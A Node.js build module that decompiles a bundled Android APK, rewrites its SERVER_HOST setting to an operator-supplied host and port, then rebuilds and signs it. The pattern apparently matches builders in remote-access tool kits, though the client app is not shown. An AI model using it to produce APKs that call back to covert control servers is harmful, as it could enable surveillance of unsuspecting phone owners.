const cp = require('child_process');
const fs = require('fs');
const path = require('path');
const config = require('./config');

// Progress file path
const progressFile = path.join(config.dbPath, 'build_progress.json');

// Paths for APK building
const apkToolPath = path.join(__dirname, '../app/factory/apktool.jar');
const signerPath = path.join(__dirname, '../app/factory/uber-apk-signer.jar');
const rawApkPath = path.join(__dirname, '../app/factory/rawapk/app-debug.apk');
const decompilePath = path.join(__dirname, '../app/factory/decompiled');
const builtApkPath = path.join(config.dbPath, 'built_apks');
const outputApk = path.join(builtApkPath, 'build.apk');
const signedApk = path.join(builtApkPath, 'build.s.apk');

// Smali class path
const smaliClassPath = path.join('com', 'fason', 'app', 'core', 'config', 'Config.smali');

// Ensure directories exist
if (!fs.existsSync(builtApkPath)) fs.mkdirSync(builtApkPath, { recursive: true });

function progress(step, message, complete = false) {
    try {
        fs.writeFileSync(progressFile, JSON.stringify({ step, message, complete, time: new Date().toISOString() }));
    } catch (e) {}
    console.log(`[BUILD] ${step}: ${message}`);
}

function getProgress() {
    try {
        if (fs.existsSync(progressFile)) {
            return JSON.parse(fs.readFileSync(progressFile, 'utf8'));
        }
    } catch (e) {}
    return { step: 'idle', message: 'Ready', complete: false };
}

function findSmaliPath() {
    const bases = ['smali', 'smali_classes2', 'smali_classes3', 'smali_classes4', 'smali_classes5'];
    for (const base of bases) {
        const p = path.join(decompilePath, base, smaliClassPath);
        if (fs.existsSync(p)) return p;
    }
    return null;
}

function checkJava(cb) {
    progress('java', 'Checking Java version...');
    const spawn = cp.spawn('java', ['-version']);
    let output = '';
    
    spawn.stderr.on('data', d => output += d.toString());
    spawn.on('error', () => cb('Java not found. Please install Java 8+'));
    spawn.on('close', () => {
        if (output.includes('version')) {
            progress('java', 'Java detected', true);
            cb(null);
        } else {
            cb('Java not detected');
        }
    });
}

function cleanDecompiled() {
    try {
        if (fs.existsSync(decompilePath)) {
            fs.rmSync(decompilePath, { recursive: true, force: true });
        }
        fs.mkdirSync(decompilePath, { recursive: true });
        return null;
    } catch (e) {
        return e.message;
    }
}

function decompile(cb) {
    progress('decompile', 'Cleaning workspace...');
    const err = cleanDecompiled();
    if (err) return cb('Clean failed: ' + err);
    
    if (!fs.existsSync(rawApkPath)) {
        return cb('Raw APK not found. Place app-debug.apk in app/factory/rawapk/');
    }
    
    progress('decompile', 'Decompiling APK...');
    const cmd = `java -jar "${apkToolPath}" d "${rawApkPath}" -o "${decompilePath}" -f`;
    
    cp.exec(cmd, (error) => {
        if (error) return cb('Decompile failed: ' + error.message);
        progress('decompile', 'Decompiled successfully', true);
        cb(null);
    });
}

function patch(host, port, cb) {
    progress('patch', 'Locating Config.smali...');
    const smaliFile = findSmaliPath();
    if (!smaliFile) return cb('Config.smali not found');
    
    progress('patch', 'Patching SERVER_HOST...');
    fs.readFile(smaliFile, 'utf8', (err, data) => {
        if (err) return cb('Cannot read smali file');
        
        const newUrl = `http://${host}:${port}`;
        const regex = /(\.field\s+[^\n]*\bSERVER_HOST:Ljava\/lang\/String;[^\n]*=\s*")(https?:\/\/[^"\r\n]+)(")/;
        const match = data.match(regex);
        
        if (!match) return cb('SERVER_HOST not found in smali');
        
        const currentUrl = match[2];
        if (currentUrl === newUrl) {
            progress('patch', 'Already patched', true);
            return cb(null);
        }
        
        const updated = data.replace(new RegExp(currentUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newUrl);
        
        fs.writeFile(smaliFile, updated, 'utf8', (err) => {
            if (err) return cb('Cannot write smali file');
            progress('patch', 'Patched successfully', true);
            cb(null);
        });
    });
}

function build(cb) {
    progress('build', 'Building APK...');
    const cmd = `java -jar "${apkToolPath}" b "${decompilePath}" -o "${outputApk}"`;
    
    cp.exec(cmd, (error) => {
        if (error) return cb('Build failed: ' + error.message);
        progress('build', 'APK built successfully', true);
        cb(null);
    });
}

function sign(cb) {
    progress('sign', 'Signing APK...');
    const cmd = `java -jar "${signerPath}" --apks "${outputApk}" --overwrite`;
    
    cp.exec(cmd, (error) => {
        if (error) return cb('Signing failed: ' + error.message);
        
        // Copy to download location
        try {
            fs.copyFileSync(outputApk, signedApk);
        } catch (e) {
            return cb('Copy failed: ' + e.message);
        }
        
        progress('sign', 'Signed successfully', true);
        cb(null);
    });
}

function cleanup() {
    progress('cleanup', 'Cleaning up...');
    cleanDecompiled();
    progress('cleanup', 'Done', true);
}

// Main build function
function buildApk(host, port, cb) {
    if (!host || !port) return cb('Host and port required');
    if (port < 1024 || port > 65535) return cb('Invalid port');
    
    checkJava(err => {
        if (err) return cb(err);
        
        decompile(err => {
            if (err) return cb(err);
            
            patch(host, port, err => {
                if (err) return cb(err);
                
                build(err => {
                    if (err) return cb(err);
                    
                    sign(err => {
                        if (err) return cb(err);
                        
                        cleanup();
                        progress('done', 'Build completed!', true);
                        cb(null);
                    });
                });
            });
        });
    });
}

module.exports = { buildApk, getProgress, signedApk };
